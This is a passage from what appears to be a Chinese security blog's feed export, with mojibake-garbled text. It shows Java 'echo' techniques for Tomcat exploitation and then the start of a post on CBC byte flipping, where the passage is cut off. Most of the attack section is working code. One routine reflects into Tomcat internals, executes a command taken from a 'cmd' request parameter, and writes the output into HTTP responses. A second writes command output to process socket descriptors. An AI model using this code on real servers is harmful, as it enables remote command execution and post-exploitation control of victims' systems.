class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">org.apache.tomcat.util.modeler.Registry.registry.getMBeanServer()</span></span><br><span class="line"><span class="comment">åå°„æ‹¿mbsInterceptor</span></span><br><span class="line"><span class="comment">åå°„æ‹¿repository</span></span><br><span class="line"><span class="comment">åå°„æ‹¿domainTb</span></span><br><span class="line"><span class="comment">æ“ä½œMap domainTbï¼Œæ‹¿`Catalina`çš„å€¼</span></span><br><span class="line"><span class="comment">`Catalina`ä¹Ÿæ˜¯ä¸€ä¸ªMapã€‚éå†æ‰¾åˆ°`RequestGroupInfo`ç±»å‹ï¼Œè¿™å°±æ˜¯å­˜åœ¨responseçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">    mbsInterceptorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">    Field repositoryField = mbsInterceptor.getClass().getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">    repositoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object repository = repositoryField.get(mbsInterceptor);</span><br><span class="line"></span><br><span class="line">    Field domainTbField = repository.getClass().getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">    domainTbField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map&lt;String,Map&lt;String, NamedObject&gt;&gt; domainTb = (Map) domainTbField.get(repository);</span><br><span class="line">    Map&lt;String, NamedObject&gt; catalina = domainTb.get(<span class="string">&quot;Catalina&quot;</span>);</span><br><span class="line">    Set&lt;String&gt; set = catalina.keySet();</span><br><span class="line">    <span class="keyword">for</span> (String key : set) &#123;</span><br><span class="line">        NamedObject namedObject = catalina.get(key);</span><br><span class="line">        <span class="comment">//ä¸€å±‚å±‚åˆ¤æ–­ä¸‹å»ï¼Œé˜²æ­¢æŠ¥é”™</span></span><br><span class="line">        <span class="keyword">if</span>(namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class))&#123;</span><br><span class="line">            BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();</span><br><span class="line">            <span class="keyword">if</span> (baseModelMBean.getManagedResource().getClass().isAssignableFrom(RequestGroupInfo.class)) &#123;</span><br><span class="line">                RequestGroupInfo requestGroupInfo = (RequestGroupInfo) baseModelMBean.getManagedResource();</span><br><span class="line">                <span class="comment">//åˆ¤æ–­ä¸‹processorsæ•°é‡ï¼Œæœ‰çš„æ˜¯0ï¼Œä¸æ˜¯æˆ‘ä»¬è¦æ‰¾çš„</span></span><br><span class="line">                Field processorsField = requestGroupInfo.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ArrayList&lt;RequestInfo&gt; processors = (ArrayList) processorsField.get(requestGroupInfo);</span><br><span class="line">                <span class="keyword">for</span> (RequestInfo processor : processors) &#123;</span><br><span class="line">                    <span class="comment">//å…¨éƒ¨reponseéƒ½æ‰“ä¸Šå›æ˜¾å§ã€‚å…å¾—æœ‰äº›å›æ˜¾ä¸åˆ°</span></span><br><span class="line">                    Field reqField = processor.getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    reqField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Request req = (Request) reqField.get(processor);</span><br><span class="line">                    Response response = req.getResponse();</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">//Tomcat8 ä¹‹åï¼ŒOutputBufferæ²¡æ³•è·å–äº†ã€‚åªèƒ½é€šè¿‡å¼ºè¡Œå‘å°„æ¥æ‹¿</span></span><br><span class="line">                    OutputBuffer outputBuffer = response.getOutputBuffer();</span><br><span class="line">                    <span class="comment">//Field outputBufferFiled = response.getClass().getDeclaredField(&quot;outputBuffer&quot;);</span></span><br><span class="line">                    <span class="comment">//outputBufferFiled.setAccessible(true);</span></span><br><span class="line">                    <span class="comment">//OutputBuffer outputBuffer = (OutputBuffer) outputBufferFiled.get(response);</span></span><br><span class="line">                    </span><br><span class="line">                    ByteChunk byteChunk = <span class="keyword">new</span> ByteChunk();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//æ ¹æ®è¯·æ±‚,å‘½ä»¤æ‰§è¡Œå’Œå›æ˜¾</span></span><br><span class="line">                    String cmd = req.getParameters().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    String echoEnable = req.getParameters().getParameter(<span class="string">&quot;echoEnable&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(echoEnable) &amp;&amp; cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        InputStream execInputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                        BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(execInputStream);</span><br><span class="line">                        <span class="comment">//1Mbä¸€æ®µè¯»å–</span></span><br><span class="line">                        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                        <span class="keyword">int</span> len;</span><br><span class="line">                        <span class="keyword">while</span>((len = bufferedInputStream.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                            byteChunk.append(buffer, <span class="number">0</span>, len);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//Tomcat7 è¿™æ ·</span></span><br><span class="line">                        outputBuffer.doWrite(byteChunk, response);</span><br><span class="line">                        <span class="comment">//Tomcat8 ç”¨è¿™æ ·çš„æ ¼å¼</span></span><br><span class="line">                        <span class="comment">//outputBuffer.doWrite(byteChunk);</span></span><br><span class="line">                        bufferedInputStream.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong>psï¼šå›æ˜¾ä¸å¤ªç¨³å®šï¼Œæœ‰ä¸€å°éƒ¨åˆ†æ—¶é—´ä¼šæ²¡æœ‰å›æ˜¾ã€‚ä¼°è®¡å’ŒTomcatçš„å¤šçº¿ç¨‹æœ‰å…³ã€‚å¤šåˆ·æ–°å‡ æ¬¡åˆå‡ºæ¥äº†</strong></em></p><p>è¿™é‡Œå¯ä»¥æ³¨æ„ä¸‹ã€‚æœ€ç»ˆresponseçš„è¾“å‡ºæ˜¯è°ƒç”¨<code>doWrite(ByteBuffer chunk)</code>çš„ã€‚å…¶ä¸­æœ‰è¿™ä¹ˆä¸€æ®µ</p><p><em>ChunkedOutputFilter#doWrite()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = chunk.remaining();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>chunk.remaining();</code>ï¼Œèƒ½çœ‹åˆ°è¿™æ ·çš„å…‰æ™¯ï¼š</p><p><em>Buffer#remaining()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">remaining</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rem = limit - position;</span><br><span class="line">    <span class="keyword">return</span> rem &gt; <span class="number">0</span> ? rem : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨è¿›è¡Œ<code>ByteBuffer.put()</code>ä»¥åï¼Œéœ€è¦è®©å­—èŠ‚æŒ‡é’ˆå½’ä½ã€‚ä¸ç„¶<code>Buffer#remaining()</code>è¿”å›<code>0</code></p><p>é€‚é…å¤šç‰ˆæœ¬çš„æ€è·¯æ˜¯ï¼šä¸åŒç‰ˆæœ¬ï¼Œæœ‰äº›æ–¹æ³•å‚æ•°ä¸ä¸€æ ·ï¼ŒåŒ…åä¸ä¸€æ ·ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥â€œç›¸å¯¹åŠ¨æ€â€åœ°è°ƒç”¨ã€‚å¹¶åŠ å…¥try-catchã€‚å¦‚æœæ–¹æ³•ä¸å­˜åœ¨ï¼Œå°±è¯´æ˜å½“å‰Tomcatæ˜¯å…¶ä»–ç‰ˆæœ¬</p><h2 id="ClassLoaderæ‹¿Context"><a href="#ClassLoaderæ‹¿Context" class="headerlink" title="* ClassLoaderæ‹¿Context"></a>* ClassLoaderæ‹¿Context</h2><p>ä½œä¸ºä¸€ä¸ªæŠ€å·§ï¼ŒTomcatä¸­<code>Servlet</code>çš„<code>ClassLoader</code>æ˜¯<code>ParallelWebappClassLoader</code>ã€‚æ‰€ä»¥åªè¦æ‹¿åˆ°<code>Servlet.class.getClassLoader</code>ï¼Œå°±èƒ½æ‹¿åˆ°<code>ParallelWebappClassLoader</code>ã€‚åœ¨<code>ParallelWebappClassLoader</code>ä¸­å¯ä»¥é€šè¿‡<code>ParallelWebappClassLoader.resources.context</code>æ‹¿åˆ°<code>Context</code>ï¼Œè¿™æ ·ï¼Œå†…å­˜é©¬å•Šå›æ˜¾å•Šéƒ½èƒ½æå®šäº†ã€‚</p><p><code>Thread.currentThread().getContextClassLoader()</code>å¯è·å¾—å½“å‰çº¿ç¨‹çš„<code>ClassLoader()</code>ï¼Œå¦‚æœè¯¥ä»£ç å†™åœ¨<code>Servlet</code>ä¸­æˆ–æ˜¯ç”±<code>Servlet</code>è§¦å‘çš„è¯ï¼Œ<code>ClassLoader</code>æ˜¯<code>ParallelWebappClassLoader</code></p><p>é€šè¿‡<code>ParallelWebappClassLoader.resources.context</code>æ‹¿åˆ°çš„<code>Context</code>æ˜¯<code>StandardContext</code>çš„å®ä¾‹ã€‚å¯¹äºå›æ˜¾æ¥è¯´ï¼Œä»<code>StandardContext</code>æ‹¿åˆ°çœŸæ­£çš„<code>Request</code>çš„è·¯å¾„å¦‚ä¸‹:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.service.connectors.0.protocolHandler.handler.global.processors</span><br></pre></td></tr></table></figure><h2 id="getServletContext"><a href="#getServletContext" class="headerlink" title="* getServletContext()"></a>* getServletContext()</h2><p>åœ¨Servletä¸‹ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨<code>getServletContext()</code>ï¼Œè·å–<code>ServletContext</code>ã€‚<code>ServletContext</code>çš„ç±»å‹æ˜¯<code>ApplicationContextFacade</code>ã€‚è¯¥ç±»å‹å¯ä»¥é€šè¿‡<code>context.context</code>è·å–<code>StandardContext</code>ã€‚ä»<code>StandardContext</code>è·å–åˆ°<code>Request</code>çš„è·¯å¾„ä¸Šæ–‡æœ‰è¯´ã€‚</p><h2 id="NioEndpoint"><a href="#NioEndpoint" class="headerlink" title="* NioEndpoint"></a>* NioEndpoint</h2><p><a href="http://wjlshare.com/archives/1549">æœ¨å¤´å¸ˆå‚…</a>æåˆ°çš„ï¼Œæ„Ÿè§‰æ˜¯å¾ˆé€šç”¨çš„æ–¹æ³•ã€‚ç”±äºä¸Šæ–‡â€ClassLoaderæ‹¿Contextâ€å’Œâ€getServletContext()â€æ— æ³•åœ¨Tocmat7ä¸‹ä½¿ç”¨ï¼ˆTomcat7ç»“æ„ä¸åŒï¼‰ã€‚æœ¨å¤´å¸ˆå‚…æ‰¾åˆ°äº†<code>NioEndpoint </code>ç±»ï¼Œè¯¥ç±»çš„æŠ½è±¡çˆ¶ç±»<code>AbstractEndpoint</code>ä¸­å­˜æ”¾ç€<code>handler</code>ã€‚<code>NioEndpoint</code>æ˜¯<code>socket NIO poller</code>çº¿ç¨‹çš„ä¸»æ¨¡å—ã€‚å¯ä»¥é€šè¿‡éå†çº¿ç¨‹è·å–åˆ°<code> NioEndpoint$Poller</code>ï¼Œå†è·å–å…¶çˆ¶ç±»<code>NioEndpoint</code>ã€‚ç›´æ¥å¾—åˆ°<code>handler.global.processors</code>çš„è·¯å¾„ä»¥è·å–Requestã€‚</p><p>å¤§æ¦‚çš„ä»£ç å¦‚ä¸‹ï¼Œæ‡’å¾—æµ‹äº†ï¼Œå›æ˜¾é©¬ä¹Ÿä¸å¸¸ç”¨äº†233,,,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Field threadsFields = threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">threadsFields.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Thread[] threads = (Thread[]) threadsFields.get(threadGroup);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">    <span class="keyword">if</span> (thread != <span class="keyword">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;http&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        Field targetField = java.lang.Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">        targetField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object target = targetField.get(thread);</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><p>ç¿»Tomcatå¤„ç†è·¯ç”±è¿™ä¸€å—é€»è¾‘æ—¶çœ‹åˆ°çš„ï¼Œè™šæ‹Ÿä¸»æœºçš„Mapç±»<code>MappedHost</code>æ˜¯ä¸€ä¸ªé™æ€ç±»ï¼Œå…¶æˆå‘˜<code>contextList</code>å’Œ<code>object</code>ä¸­å­˜åœ¨<code>Context</code>ã€‚å…·ä½“çš„åå°„æ‹¿è¿˜æ²¡è¯•ï¼Œåº”è¯¥æ˜¯å¯ä»¥çš„ã€‚èµ°çš„è¿˜æ˜¯å‰æ–‡â€ClassLoaderæ‹¿Contextâ€çš„è€è·¯</p><h2 id="Linuxä¸‹Tomcatå›æ˜¾-ä¸é€šç”¨"><a href="#Linuxä¸‹Tomcatå›æ˜¾-ä¸é€šç”¨" class="headerlink" title="Linuxä¸‹Tomcatå›æ˜¾ - ä¸é€šç”¨"></a>Linuxä¸‹Tomcatå›æ˜¾ - ä¸é€šç”¨</h2><p>æ€è·¯ï¼šæ‰¾socketæè¿°ç¬¦ï¼Œæ²¡æ³•ç¡®å®šæ˜¯å“ªä¸€ä¸ªå°±ä¾æ¬¡<code>write()</code>ï¼Œæ€»ä¼šæ‰¾åˆ°èƒ½<code>write()</code>çš„é‚£ä¸ªã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//have no request &amp; response args. Only execute command by fixed</span></span><br><span class="line"><span class="comment">//cmd</span></span><br><span class="line">InputStream cmdin = Runtime.getRuntime().exec(<span class="string">&quot;ip a&quot;</span>).getInputStream();</span><br><span class="line">String cmdRes = <span class="keyword">new</span> String(readBytesFromInputStream(cmdin, <span class="number">1024</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šè¿‡ManagementFactory.getRuntimeMXBean()æ‰¾Tomcatçš„PID</span></span><br><span class="line">String name = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">System.out.println(<span class="string">&quot;Runtime: &quot;</span> + name);</span><br><span class="line"><span class="comment">//åˆ‡å‰²ï¼Œæ‹¿PID</span></span><br><span class="line">String pid = name.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">String path = <span class="string">&quot;/proc/&quot;</span> + pid + <span class="string">&quot;/fd&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;path: &quot;</span> + path);</span><br><span class="line"></span><br><span class="line"><span class="comment">//fetchæ‰€æœ‰çš„fd socketæ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line">String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls -l &quot;</span> + path + <span class="string">&quot; | grep socket:&quot;</span>&#125;;</span><br><span class="line">InputStream inputStream6 = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"><span class="keyword">byte</span>[] bytes6 = readBytesFromInputStream(inputStream6, <span class="number">1024</span>);</span><br><span class="line">String socketFilesString = <span class="keyword">new</span> String(bytes6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//split by line and fetch one by one</span></span><br><span class="line">String[] socketFilesArr = socketFilesString.split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (String socketFile : socketFilesArr) &#123;</span><br><span class="line">    String stringLeft = socketFile.split(<span class="string">&quot; -&gt;&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    String[] socketDescriptorArr = stringLeft.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    String socketDescriptor = socketDescriptorArr[socketDescriptorArr.length - <span class="number">1</span>];</span><br><span class="line">    <span class="comment">//compent the path</span></span><br><span class="line">    String socketDescriptorPath = path + <span class="string">&quot;/&quot;</span> + socketDescriptor;</span><br><span class="line">    System.out.println(socketDescriptorPath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Constructor&lt;FileDescriptor&gt; fileDescriptorConstructor = FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;<span class="keyword">int</span>.class&#125;);</span><br><span class="line">        fileDescriptorConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        FileDescriptor fileDescriptor = fileDescriptorConstructor.newInstance(Integer.parseInt(socketDescriptor));</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(fileDescriptor);</span><br><span class="line"></span><br><span class="line">        fileOutputStream.write((<span class="string">&quot;HTTP/1 200 OK\r\n\r\n&quot;</span> + cmdRes + <span class="string">&quot;\r\n\r\n&quot;</span>).getBytes());</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] &quot;</span> + socketDescriptorPath);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><img src="/2022/07/07/2022-07-07-java-echo/2.png" style="zoom: 67%;"><p>å¹¶å‘å¤ªå¤šï¼Œå®¹æ˜“çƒ‚æ‰</p><img src="/2022/07/07/2022-07-07-java-echo/1.png" style="zoom: 67%;"><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://mp.weixin.qq.com/s/0fWSp71yuaxL_TkZV65EwQ">Javaå›æ˜¾ç»¼è¿°</a></p><p><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">é€šæ€æ¼æ´åˆ©ç”¨å›æ˜¾æ–¹æ³•-linuxå¹³å°</a></p><p><a href="https://xz.aliyun.com/t/7307">linuxä¸‹javaååºåˆ—åŒ–é€šæ€å›æ˜¾æ–¹æ³•çš„ä½é…ç‰ˆå®ç°</a></p><p><a href="https://mp.weixin.qq.com/s/SGxpWPrEm4dAi7uEcP8EKQ">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•</a></p><p><a href="http://redteam.today/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/">tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">åŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶</a></p><p><a href="https://man7.org/linux/man-pages/man5/proc.5.html">https://man7.org/linux/man-pages/man5/proc.5.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ‰€è°“å›æ˜¾ã€‚æ ¹æ®å„å¸ˆå‚…çš„æ–‡ç« æ‰€è¯´ã€‚ç°æœ‰çš„å¤§å¤šæ•°æ˜¯ç”¨defineClass æˆ– URLClassLoaderã€‚åŠ è½½æ¶æ„ç±»å¹¶æ‰§è¡Œã€‚æ¶æ„ç±»ä¸­è¿›è¡Œä¾‹å¦‚æŠ¥é”™ã€å†™æ•°æ®ã€å¼€RMIé€šä¿¡ã€ç­‰è¿™äº›æ“ä½œã€‚å°±å›æ˜¾äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸ï¼Œå…¶å®ï¼Œæ¶‰åŠåˆ°å†…å­˜é©¬åŠ è½½ï¼Œéƒ½è¦ç”¨è¿™ã€‚&lt;/p&gt;
&lt;p&gt;ååºåˆ—åŒ–å›æ˜¾ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¾é æœ€ç»ˆçš„ä»£ç æ‰§è¡Œç‚¹ï¼Œæ‰§è¡Œåˆ°defineClassæˆ–URLClassLoaderã€‚ï¼ŒRCEå˜›ï¼Œå’±æƒ³æ€ä¹ˆæ“ä½œå°±æ€ä¹ˆæ“ä½œã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
    
    <category term="RMI" scheme="http://example.com/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>CBCå­—èŠ‚ç¿»è½¬</title>
    <link href="http://example.com/2022/05/17/2022-05-17-cbc-byte-flipping-attack/"/>
    <id>http://example.com/2022/05/17/2022-05-17-cbc-byte-flipping-attack/</id>
    <published>2022-05-17T05:30:00.000Z</published>
    <updated>2022-05-17T06:15:43.199Z</updated>
    
    <content type="html"><![CDATA[<p>åˆæœ‰åŠå¹´æ²¡æ›´åšå®¢233ï¼Œä¸»è¦æ˜¯æ‡’ï¼Œç¬”è®°å’Œæ–‡è¿˜æ˜¯æœ‰å†™çš„ï¼Œåªä¸è¿‡æˆ‘å¼€äº†ä¸€ä¸ªç§å¯†çš„è¯­é›€ï¼Œæ–‡éƒ½æ”¾åˆ°è¯­é›€ä¸Šäº†ã€‚ç°åœ¨ä»è¯­é›€é‚£æ‰’æ‹‰å‡ ç¯‡æ–‡ï¼Œä¸¢åˆ°åšå®¢ä¸Šå§ã€‚</p><span id="more"></span><p>æ¦‚å¿µ</p><p>ç®€å•æ¥è¯´CBCæ˜¯ä¸€ç§åŠ å¯†æ¨¡å¼ï¼ˆæˆ‘ä¹Ÿæ²¡å­¦å¤ªæ·±ï¼‰ï¼Œå…¨ç§° cipher block chainingã€‚å³å—åŠ å¯†é“¾ã€‚</p><p>åŠ å¯†æ—¶ï¼Œ<strong>æ˜æ–‡ä¼šæŒ‰ç…§çº¦å®šçš„å—å¤§å°ï¼Œåˆ†å‰²æˆå„ä¸ªå°å—ï¼Œå¹¶ä¾æ¬¡åŠ è§£å¯†</strong>ã€‚å¦‚ä¸‹å›¾çš„åŠ è§£å¯†è¿‡ç¨‹æ‰€ç¤ºã€‚å›¾æº <a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attackâ€”101 approach</a></p><p><img src="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/1.png"></p><p><img src="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/2.png"></p><p>ç®€å•æ¥è¯´ã€‚åœ¨CBCæ¨¡å¼ä¸­ï¼ŒåŠ å¯†ä¸€æ®µæ˜æ–‡ï¼Œéœ€è¦å››è¦ç´ ï¼š</p><ul><li>æ˜æ–‡</li><li>å›ºå®šå—å¤§å°</li><li>åŠ å¯†keyï¼Œé•¿åº¦ä¸ºå—å¤§å°çš„é•¿åº¦</li><li>iv - éšæœºç”Ÿæˆçš„ä¸€ä¸²å­—èŠ‚ï¼Œé•¿åº¦ä¹Ÿæ˜¯å—å¤§å°çš„é•¿åº¦</li></ul><p>å—å¤§å°æ˜¯å¯ä»¥æŒ‡å®šçš„ï¼Œå¸¸ç”¨çš„æ˜¯16å­—èŠ‚</p><p>åŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼Œä»¥å—ä¸ºå•ä½ï¼ˆå·çš„<a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attackâ€”101 approach</a>ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ciphertext-0 = Encrypt(Plaintext XOR IV)</span><br><span class="line">Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ®µåŠ å¯†çš„å—ï¼ŒåŠ å¯†æ—¶çš„å‚æ•°æ˜¯ <code>æ˜æ–‡å— å¼‚æˆ– iv</code></p><p>ç¬¬äºŒæ®µåŠä¹‹åçš„å—ï¼ŒåŠ å¯†æ—¶çš„å‚æ•°æ˜¯ <code>æ˜æ–‡å— å¼‚æˆ– å‰ä¸€æ®µåŠ å¯†å—</code>ã€‚å³æŠŠå‰ä¸€æ®µåŠ å¯†å—å½“ivä½¿ã€‚</p><p>è§£å¯†ç®—æ³•å¦‚ä¸‹ï¼ŒåŒæ ·ä¹Ÿæ˜¯ä»¥å—ä¸ºå•ä½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Plaintext-0 = Decrypt(Ciphertext) XOR IV</span><br><span class="line"></span><br><span class="line">Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ®µè§£å¯†çš„å—ï¼Œè§£å¯†æ—¶çš„å‚æ•°æ˜¯ <code>å¯†æ–‡å— å¼‚æˆ– iv</code></p><p>ç¬¬äºŒæ®µåŠä¹‹åçš„å—ï¼Œè§£å¯†æ—¶çš„å‚æ•°æ˜¯ <code>å¯†æ–‡å— å¼‚æˆ– å‰ä¸€æ®µåŠ å¯†å—</code>ã€‚å³æŠŠå‰ä¸€æ®µåŠ å¯†å—å½“ivä½¿ã€‚</p><p>æ³¨æ„è§£å¯†æ—¶å¼‚æˆ–çš„ä¾ç„¶è¿˜æ˜¯åŠ å¯†å—ã€‚</p><h1 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" 